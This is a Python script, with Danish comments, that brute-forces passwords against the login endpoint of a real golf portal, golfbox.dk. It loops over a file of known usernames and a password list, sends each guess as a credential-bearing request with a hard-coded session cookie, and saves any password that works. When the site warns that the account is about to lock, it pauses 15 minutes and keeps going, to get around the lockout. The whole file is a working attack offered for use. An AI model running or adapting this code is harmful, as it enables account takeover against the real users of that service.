import requests
import time
from tqdm import tqdm

class GolfBoxPasswordCracker:
    def __init__(self, valid_usernames_file, password_file):
        with open(valid_usernames_file, 'r') as uf:
            self.usernames = [line.strip() for line in uf]

        with open(password_file, 'r') as pf:
            self.passwords = [line.strip() for line in pf]

        self.url_template = 'https://www.golfbox.dk/portal/login/testLogin.asp?user={}&pass={}'
        
        self.headers = {
            'Accept': '*/*',
            'Accept-Language': 'da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7,nl;q=0.6',
            'Connection': 'keep-alive',
            'Cookie': 'ASPSESSIONIDQEDTBRBS=NFELCNJCGFLNICKAHDAHNOBI; cookiePolicy=1; GolfGuideLocation=DK',
            'Referer': 'https://www.golfbox.dk/login.asp?selected={88FC5719-5D6E-45AA-9782-A8F69C25EDB1}',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android'
        }

    def save_password(self, username, password):
        """Gemmer den gættede adgangskode for et brugernavn."""
        with open(f"{username}.txt", "a") as f:
            f.write(password)

    def test_login(self, username, password):
        url = self.url_template.format(username, password)
        try:
            response = requests.post(url, headers=self.headers)
            return response.json()
        except Exception as e:
            return {'txt': str(e)}

    def run(self):
        for username in self.usernames:
            print(f"Checking for username: {username}")
            line_num = 0
            for password in tqdm(self.passwords, desc=f"Trying passwords for {username}", dynamic_ncols=True):
                line_num += 1
                result = self.test_login(username, password)
                
                # Tjek responsen
                if result.get("txt") == "ok":
                    print(f"Password found for {username}!")
                    self.save_password(username, password)
                    break
                elif "Antal forsøg tilbage inden din konto bliver låst: 1!" in result.get("txt", ""):
                    print(f"Pausing for 15 minutes at password line {line_num}.")
                    time.sleep(15 * 60)  # Sover i 15 minutter
                    continue

# Brug:
cracker = GolfBoxPasswordCracker("validUsernames_list.txt", "filtered_passwords_short.txt")
cracker.run()
